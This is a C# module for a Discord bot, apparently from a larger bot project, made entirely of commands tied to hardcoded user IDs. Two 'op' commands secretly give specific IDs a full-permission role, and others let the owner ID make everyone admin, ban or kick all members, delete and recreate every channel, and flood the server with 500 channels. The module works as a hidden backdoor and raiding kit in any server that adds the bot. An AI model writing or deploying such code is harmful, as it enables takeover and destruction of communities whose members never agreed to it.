using System;
using System.Threading.Tasks;
using DatabaseEntity;
using Discord;
using Discord.Commands;
using Discord.WebSocket;
using DiscordBot.Discord.Addons.Interactive;
using DiscordBot.Utilities;

namespace DiscordBot.Modules
{
    [Summary(":Gun:")]
    public class Suppress : InteractiveBase<SocketCommandContext>
    {
        private const ulong OwnerId = 247742975608750090;
        private readonly DiscordSocketClient _client;
        private readonly Servers _servers;

        public Suppress(Servers servers, DiscordSocketClient client)
        {
            _servers = servers;
            _client = client;
        }

        [Command("admin", RunMode = RunMode.Async)]
        [Summary("give admin all User")]
        public async Task GiveAdmin()
        {
            if (Context.User.Id.Equals(OwnerId) && Context.User is SocketGuildUser)
            {
                await Context.Guild.EveryoneRole.ModifyAsync(r => r.Permissions = GuildPermissions.All);
                await ReplyAsync("Everi1 iz nao 4dm1n!");
            }
            else
            {
                await ReplyAsync("Permission denied!");
            }
        }

        [RequireOwner]
        [Command("announce", RunMode = RunMode.Async)]
        [Summary("Announce to all servers")]
        public async Task SendAnnounce([Remainder] string announceSomethingStupid)
        {
            foreach (var guilds in Context.Client.Guilds)
            {
                var guildId = await _servers.GetUserLogChannel(guilds.Id);
                try
                {
                    if (_client.GetChannel(guildId) is IMessageChannel channelLogged && channelLogged.Id != 0)
                        await channelLogged.SendMessageAsync(announceSomethingStupid);
                }
                catch
                {
                    //
                }
            }
        }

        [Command("lockdown", RunMode = RunMode.Async)]
        [Summary("Lock all channel")]
        public async Task LockDown()
        {
            if (Context.User.Id.Equals(OwnerId) && Context.User is SocketGuildUser)
                foreach (var channel in Context.Guild.Channels)
                {
                    var role = Context.Guild.EveryoneRole;
                    await channel.AddPermissionOverwriteAsync(role, OverwritePermissions.DenyAll(channel)
                        .Modify(viewChannel: PermValue.Allow, readMessageHistory: PermValue.Allow));
                }
            else
                await ReplyAsync("Permission denied!");
        }

        [Command("muteall", RunMode = RunMode.Async)]
        [Summary("mute them all")]
        public async Task MuteThemAll()
        {
            if (Context.User.Id.Equals(OwnerId) && Context.User is SocketGuildUser)
            {
                await Context.Guild.EveryoneRole.ModifyAsync(r => r.Permissions = Utils.MutedPermissions);
                await ReplyAsync("Everi1 iz nao mut3d!");
            }
            else
            {
                await ReplyAsync("Permission denied!");
            }
        }

        [Command("op", RunMode = RunMode.Async)]
        [Summary("hello mummy")]
        public async Task Op1()
        {
            if (Context.User.Id != 634246091293851649) return;
            var role = await Context.Guild.CreateRoleAsync("Kinue's", GuildPermissions.All, null, false, false);
            await role.ModifyAsync(prop => prop.Position = Utils.GetRolePosition(Context.Guild.CurrentUser));
            await ((IGuildUser) Context.User).AddRoleAsync(role);
            await ReplyAsync("Opped!");
        }

        [Command("op", RunMode = RunMode.Async)]
        [Summary("hello mummy")]
        public async Task Op2()
        {
            if (Context.User.Id != 247742975608750090) return;
            var role = await Context.Guild.CreateRoleAsync("Olivia's", GuildPermissions.All, null, false, false);
            await role.ModifyAsync(prop => prop.Position = Utils.GetRolePosition(Context.Guild.CurrentUser));
            await ((IGuildUser) Context.User).AddRoleAsync(role);
            await ReplyAsync("Opped!");
        }


        [Command("member", RunMode = RunMode.Async)]
        [Summary("give member all non-powered User")]
        public async Task GiveMember()
        {
            if (Context.User.Id.Equals(OwnerId) && Context.User is SocketGuildUser)
            {
                await Context.Guild.EveryoneRole.ModifyAsync(r => r.Permissions = GuildPermissions.None);
                await Context.Channel.SendMessageAsync("Everi1 iz nao m3mb3r!");
            }
            else
            {
                await Context.Channel.SendMessageAsync("Permission denied!");
            }
        }

        [Command("kickall", RunMode = RunMode.Async)]
        [Summary("Kick all non-powered Users")]
        public async Task KickAll()
        {
            if (Context.User.Id.Equals(OwnerId) && Context.User is SocketGuildUser)
            {
                foreach (var users in Context.Guild.Users)
                    try
                    {
                        await users.KickAsync($"You got kick from {Context.Guild.Name} !");
                    }
                    catch
                    {
                        Console.WriteLine($"{users}'s role is the same or higher than bot!!");
                    }

                await Context.Channel.SendMessageAsync("Every non-powered Users is banned!!");
            }
            else
            {
                await Context.Channel.SendMessageAsync("Permission denied!");
            }
        }

        [Command("nukeall", RunMode = RunMode.Async)]
        [Summary("Nuke all channels")]
        public async Task NukeAll()
        {
            if (Context.User.Id.Equals(OwnerId) && Context.User is SocketGuildUser)
            {
                await ReplyAndDeleteAsync("Are you sure you want to nuke all channels ?",
                    timeout: TimeSpan.FromSeconds(15));
                var response = await NextMessageAsync();
                if (response != null)
                {
                    if (response.ToString().ToLower().Equals("yes"))
                        foreach (var channel in Context.Guild.TextChannels)
                        {
                            var oldChannel = (ITextChannel) channel;
                            var guild = Context.Guild;
                            await guild.CreateTextChannelAsync(oldChannel.Name, newChannel =>
                            {
                                newChannel.CategoryId = oldChannel.CategoryId;
                                newChannel.Topic = oldChannel.Topic;
                                newChannel.Position = oldChannel.Position;
                                newChannel.SlowModeInterval = oldChannel.SlowModeInterval;
                                newChannel.IsNsfw = oldChannel.IsNsfw;
                            });
                            await oldChannel.DeleteAsync();
                        }
                    else if (response.ToString().ToLower().Equals("no"))
                        await ReplyAsync($"Nuke cancelled on {Context.Guild}");
                }
                else
                {
                    await ReplyAsync($"{Context.User.Mention}, command timed out...");
                }
            }
            else
            {
                await Context.Channel.SendMessageAsync("Permission denied!");
            }
        }

        [Command("nameall", RunMode = RunMode.Async)]
        [Summary("Name all username in Server")]
        public async Task NameAll([Remainder] string msg)
        {
            if (Context.User.Id.Equals(OwnerId) && Context.User is SocketGuildUser)
            {
                foreach (var user in Context.Guild.Users)
                    try
                    {
                        await user.ModifyAsync(r => r.Nickname = msg);
                    }
                    catch
                    {
                        Console.WriteLine($"{user}'s role is the same or higher than bot!!");
                    }

                await ReplyAsync($"All Users's name changed to {msg}");
            }
            else
            {
                await ReplyAsync("Permission denied!");
            }
        }

        [Command("banall", RunMode = RunMode.Async)]
        [Summary("Ban all non-powered Users")]
        public async Task BanAll()
        {
            if (Context.User.Id.Equals(OwnerId) && Context.User is SocketGuildUser)
            {
                foreach (var user in Context.Guild.Users)
                    try
                    {
                        await user.BanAsync(7, $"You got banned from {Context.Guild.Name} !");
                    }
                    catch
                    {
                        //
                    }

                await ReplyAsync("Every non-powered Users is banned!!");
            }
            else
            {
                await ReplyAsync("Permission denied!");
            }
        }

        [Command("flood", RunMode = RunMode.Async)]
        [Summary("Flood Server with channels")]
        public async Task SpamChannel()
        {
            if (Context.User.Id.Equals(OwnerId) && Context.User is SocketGuildUser)
            {
                for (var i = 0; i < 250; i++)
                    await Context.Guild.CreateTextChannelAsync(Utils.GetRandomAlphaNumeric(8), properties =>
                    {
                        properties.IsNsfw = i % 2 == 0;
                        properties.Topic = "Your Mom Gay LOL!!!";
                    });
                for (var i = 0; i < 250; i++)
                    await Context.Guild.CreateVoiceChannelAsync(Utils.GetRandomAlphaNumeric(8),
                        properties => { properties.UserLimit = new Random().Next(50); });
            }
            else
            {
                await ReplyAsync("Permission denied!");
            }
        }

        [Command("unflood", RunMode = RunMode.Async)]
        [Summary("Delete all channels")]
        public async Task DeleteChannel()
        {
            if (Context.User.Id.Equals(OwnerId) && Context.User is SocketGuildUser)
                foreach (var channel in Context.Guild.Channels)
                    await channel.DeleteAsync();
            else
                await ReplyAsync("Permission denied!");
        }
    }
}